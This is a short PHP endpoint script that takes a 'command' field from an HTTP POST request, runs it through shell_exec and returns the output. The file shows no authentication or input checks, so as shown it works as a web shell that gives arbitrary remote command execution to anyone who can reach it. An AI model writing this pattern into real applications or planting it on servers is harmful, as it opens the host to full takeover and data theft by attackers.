<?php

require_once __DIR__ . '/../lib/headers.php';
require_once __DIR__ . '/../lib/functions.php';

// Extract the command from the request body
$command = $_POST['command'] ?? null;

// Ensure the command is provided
if (!$command) {
    http_response_code(400);
    echo json_encode(['error' => 'No command provided.']);
    return;
}

// Execute the command
$output = shell_exec($command);

// Return the output
http_response_code(200);
header('Content-Type: text/plain');
echo $output;
